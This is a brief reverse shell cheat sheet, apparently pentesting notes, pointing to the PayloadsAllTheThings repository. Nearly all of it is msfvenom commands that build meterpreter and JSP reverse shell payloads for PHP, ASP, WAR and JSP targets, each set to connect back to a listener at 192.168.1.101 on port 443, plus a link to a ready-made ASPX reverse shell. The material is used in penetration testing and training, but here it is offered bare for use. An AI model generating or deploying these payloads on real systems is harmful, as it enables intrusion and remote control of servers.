## Reverse Shell Cheat Sheet

[PayloadsAllTheThings Github Repo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## PHP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
```

## ASP/ASPX

```
https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp
```

## WAR

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
```

## JSP

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
```